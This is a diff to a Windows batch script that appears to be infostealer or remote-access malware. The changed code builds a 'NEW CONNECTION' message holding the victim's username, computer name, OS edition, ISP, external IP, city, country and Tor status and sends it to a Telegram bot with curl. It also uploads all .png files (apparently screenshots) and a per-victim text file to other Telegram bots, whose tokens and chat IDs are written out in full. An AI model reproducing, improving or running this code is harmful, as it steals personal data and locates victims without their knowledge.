@@ -78,10 +78,13 @@ if "%status%"=="404" (
 ) else (
   echo.
 )
-echo %WS% >> "%username%@%computername%.txt"
-echo %ExtIP% >> "%username%@%computername%.txt"
 
-"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
+SET "InputVariable=NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
+for /f "usebackq delims=" %%i in (`powershell -command "$OutputVariable='%InputVariable%'-replace '[^\x00-\x7F]', ''; $OutputVariable"`) do set "OutputVariable=%%i"
+for /f "usebackq delims=" %%i in (`powershell -command "$username='%username%'-replace '[^\x00-\x7F]', ''; $username"`) do set "username=%%i"
+for /f "usebackq delims=" %%i in (`powershell -command "$computername='%computername%'-replace '[^\x00-\x7F]', ''; $computername"`) do set "computername=%%i"
+
+"%environment%\curl.exe" -k %proxy% -F text="%OutputVariable% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
 "%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
 
